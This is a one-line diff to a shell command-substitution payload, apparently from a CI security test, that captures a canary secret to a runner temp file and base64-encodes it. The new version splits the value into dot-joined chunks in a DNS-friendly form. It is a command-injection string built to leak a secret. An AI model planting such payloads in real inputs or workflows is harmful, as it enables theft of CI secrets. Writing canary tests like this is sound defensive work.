@@ -1,1 +1,1 @@
-$(printf %s "$OWNED_CANARY" > "$RUNNER_TEMP/owned-canary-captured.txt"; printf "x%s" "$OWNED_CANARY" | base64 -w0)
+$(printf %s "$OWNED_CANARY" > "$RUNNER_TEMP/owned-canary-captured.txt"; a="${OWNED_CANARY:0:32}"; b="${OWNED_CANARY:32}"; printf "%s.%s" "$(printf %s "$a" | base64 -w0)" "$(printf %s "$b" | base64 -w0)")
